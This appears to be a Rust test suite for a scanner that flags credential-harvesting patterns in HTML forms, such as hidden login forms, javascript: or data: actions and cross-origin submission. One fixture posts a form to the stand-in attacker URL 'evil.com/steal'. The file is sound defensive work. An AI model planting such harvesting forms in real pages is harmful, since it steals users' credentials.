use crate::credential_harvest_audit::*;

#[test]
fn empty_body_no_issues() {
    let issues = analyze_credential_harvest("", "");
    assert!(issues.is_empty());
}

#[test]
fn no_form_no_issues() {
    let body = "<html><body>Hello</body></html>";
    let issues = analyze_credential_harvest(body, "");
    assert!(issues.is_empty());
}

#[test]
fn simple_form_no_issues() {
    let body = r#"<form action="/login" method="post"><input type="text"></form>"#;
    let issues = analyze_credential_harvest(body, "example.com");
    assert!(issues.is_empty());
}

#[test]
fn detects_cross_origin_action() {
    let body =
        r#"<form action="https://evil.com/steal" method="post"><input type="text"></form>"#;
    let issues = analyze_credential_harvest(body, "example.com");
    assert!(issues.iter().any(|i| matches!(
        i,
        CredentialHarvestIssue::CrossOriginFormAction { .. }
    )));
}

#[test]
fn same_origin_no_cross_origin_issue() {
    let body =
        r#"<form action="https://example.com/login" method="post"><input type="text"></form>"#;
    let issues = analyze_credential_harvest(body, "example.com");
    assert!(!issues.iter().any(|i| matches!(
        i,
        CredentialHarvestIssue::CrossOriginFormAction { .. }
    )));
}

#[test]
fn detects_data_uri_action() {
    let body = r#"<form action="data:text/html,test"><input type="text"></form>"#;
    let issues = analyze_credential_harvest(body, "");
    assert!(issues.contains(&CredentialHarvestIssue::DataUriFormAction));
}

#[test]
fn detects_javascript_action() {
    let body = r#"<form action="javascript:void(0)"><input type="text"></form>"#;
    let issues = analyze_credential_harvest(body, "");
    assert!(issues.contains(&CredentialHarvestIssue::JavascriptFormAction));
}

#[test]
fn detects_form_target_blank() {
    let body = r#"<form action="/login" target="_blank"><input type="text"></form>"#;
    let issues = analyze_credential_harvest(body, "");
    assert!(issues.contains(&CredentialHarvestIssue::FormTargetBlank));
}

#[test]
fn detects_hidden_login_form_display_none() {
    let body = r#"<form style="display:none" action="/login"><input type="password"></form>"#;
    let issues = analyze_credential_harvest(body, "");
    assert!(issues.contains(&CredentialHarvestIssue::HiddenLoginForm));
}

#[test]
fn detects_hidden_login_form_visibility_hidden() {
    let body =
        r#"<form style="visibility:hidden" action="/login"><input type="password"></form>"#;
    let issues = analyze_credential_harvest(body, "");
    assert!(issues.contains(&CredentialHarvestIssue::HiddenLoginForm));
}

#[test]
fn detects_hidden_login_form_opacity_zero() {
    let body = r#"<form style="opacity:0" action="/login"><input type="password"></form>"#;
    let issues = analyze_credential_harvest(body, "");
    assert!(issues.contains(&CredentialHarvestIssue::HiddenLoginForm));
}

#[test]
fn visible_password_form_no_hidden_issue() {
    let body = r#"<form action="/login"><input type="password"></form>"#;
    let issues = analyze_credential_harvest(body, "");
    assert!(!issues.contains(&CredentialHarvestIssue::HiddenLoginForm));
}

#[test]
fn detects_hidden_password_container() {
    let body = r#"<form action="/login">
        <div style="display:none"><input type="password" name="pw"></div>
    </form>"#;
    let issues = analyze_credential_harvest(body, "");
    assert!(issues.contains(&CredentialHarvestIssue::PasswordFieldInHiddenContainer));
}

#[test]
fn detects_suspicious_input_names_ssn_and_cc() {
    let body = r#"<form action="/submit">
        <input name="ssn" type="text">
        <input name="credit_card" type="text">
    </form>"#;
    let issues = analyze_credential_harvest(body, "");
    assert!(issues.contains(&CredentialHarvestIssue::SuspiciousFormInputNames));
}

#[test]
fn single_suspicious_input_no_issue() {
    let body = r#"<form action="/submit"><input name="ssn" type="text"></form>"#;
    let issues = analyze_credential_harvest(body, "");
    assert!(!issues.contains(&CredentialHarvestIssue::SuspiciousFormInputNames));
}

#[test]
fn severity_hidden_login_highest() {
    assert_eq!(
        credential_harvest_severity(&CredentialHarvestIssue::HiddenLoginForm),
        8.0
    );
}

#[test]
fn severity_form_target_blank_lowest() {
    assert_eq!(
        credential_harvest_severity(&CredentialHarvestIssue::FormTargetBlank),
        3.0
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        CredentialHarvestIssue::HiddenLoginForm,
        CredentialHarvestIssue::FormTargetBlank,
    ];
    let mut seq = 0;
    let ops = credential_harvest_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(CredentialHarvestIssue::HiddenLoginForm.to_string(), "hidden_login_form");
    assert_eq!(
        CredentialHarvestIssue::PasswordFieldInHiddenContainer.to_string(),
        "hidden_password_field"
    );
    assert_eq!(CredentialHarvestIssue::DataUriFormAction.to_string(), "data_uri_form_action");
    assert_eq!(
        CredentialHarvestIssue::JavascriptFormAction.to_string(),
        "javascript_form_action"
    );
    assert_eq!(CredentialHarvestIssue::FormTargetBlank.to_string(), "form_target_blank");
    assert_eq!(
        CredentialHarvestIssue::SuspiciousFormInputNames.to_string(),
        "suspicious_input_names"
    );
}

#[test]
fn cross_origin_display_includes_action() {
    let issue = CredentialHarvestIssue::CrossOriginFormAction {
        action: "https://evil.com".to_string(),
    };
    assert_eq!(issue.to_string(), "cross_origin_form:https://evil.com");
}

#[test]
fn multiple_forms_all_checked() {
    let body = r#"
        <form action="javascript:void(0)"><input type="text"></form>
        <form action="data:text/html,x"><input type="text"></form>
    "#;
    let issues = analyze_credential_harvest(body, "");
    assert!(issues.contains(&CredentialHarvestIssue::JavascriptFormAction));
    assert!(issues.contains(&CredentialHarvestIssue::DataUriFormAction));
}

#[test]
fn no_cross_origin_without_site_domain() {
    let body =
        r#"<form action="https://example.com/login"><input type="text"></form>"#;
    let issues = analyze_credential_harvest(body, "");
    assert!(!issues.iter().any(|i| matches!(
        i,
        CredentialHarvestIssue::CrossOriginFormAction { .. }
    )));
}
